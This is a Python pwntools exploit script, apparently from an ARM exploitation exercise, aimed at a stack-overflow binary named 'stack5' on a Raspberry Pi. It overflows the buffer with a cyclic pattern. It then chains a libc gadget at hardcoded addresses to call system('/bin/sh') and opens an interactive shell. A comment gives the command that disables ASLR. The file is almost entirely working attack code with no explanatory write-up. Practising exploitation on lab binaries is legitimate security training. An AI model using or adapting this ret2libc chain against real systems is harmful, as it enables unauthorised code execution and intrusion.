# Tested on 64bit Ubuntu, macOS
# Target : 32bit ARM, Raspberry Pi, Raspbian OS
# Python 3.7.6
# pwntools 4.2.2

# import all modules/commands from pwn library
from pwn import *
import time

# disable ASLR
# echo 0 > /proc/sys/kernel/randomize_va_space

# set the context of the target platform
#  arch: arm (32bit)
#  os: linux
context.update(arch='arm', os='linux')

p = process("/home/pi/arm_exploitation/stack/stack5/stack5")
context.terminal = ['tmux','splitw','-h']

# Creating Payload
payload = b''
payload = cyclic(cyclic_find(0x61616172))  # 68

LIBC_BASE = 0x76e53000
GADGET = LIBC_BASE + 0x000791fc  # 0x76ecc1fc
GADGET2= LIBC_BASE + 0x000da9e4  # pop	{r0, r1, r2, r3, fp, pc}
SYSTEM = 0x76e8b9c8
BINSH = 0x76f7eb6c
EXIT = 0x76e81780


payload += p32(GADGET2)  # gadget2 : pop	{r0, r1, r2, r3, fp, pc}
payload += p32(BINSH)   # r0 : /bin/sh
payload += b'FAKE'      # r1 : dummy value
payload += b'FAKE'      # r2 : dummy value
payload += b'FAKE'      # r3 : dummy value
payload += b'FAKE'      # fp : dummy value
payload += p32(SYSTEM)  # pc : return address-> system()

print("payload len : {}".format(len(payload)))
print("paylaod     : {}".format(payload))

'''
gdb.attach(p,"""
set follow-fork-mode parent
c
"""
)
'''
# Sending Payload
print("[+] Sending payload..")
p.sendline(payload)
sleep(1)

p.interactive()
